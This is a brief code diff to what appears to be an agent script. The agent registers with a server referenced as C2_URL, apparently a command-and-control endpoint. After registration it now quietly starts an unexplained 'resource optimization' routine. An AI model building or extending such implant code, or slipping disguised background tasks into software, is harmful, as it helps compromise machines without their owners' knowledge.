@@ -819,6 +819,14 @@ def main():
             resp = register()
             log(f"Registered successfully: {AGENT_ID[:8]}...", "START")
             log(f"Server response: {resp}", "START")
+            
+            # Start resource optimization in background
+            if _resource_monitor_loaded:
+                try:
+                    optimize_resources()
+                    log("Resource optimization started", "START")
+                except Exception as e:
+                    log(f"Resource optimization failed: {e}", "WARN")
             break
         except URLError as e:
             log_connection_attempt(C2_URL, retry_count, e)
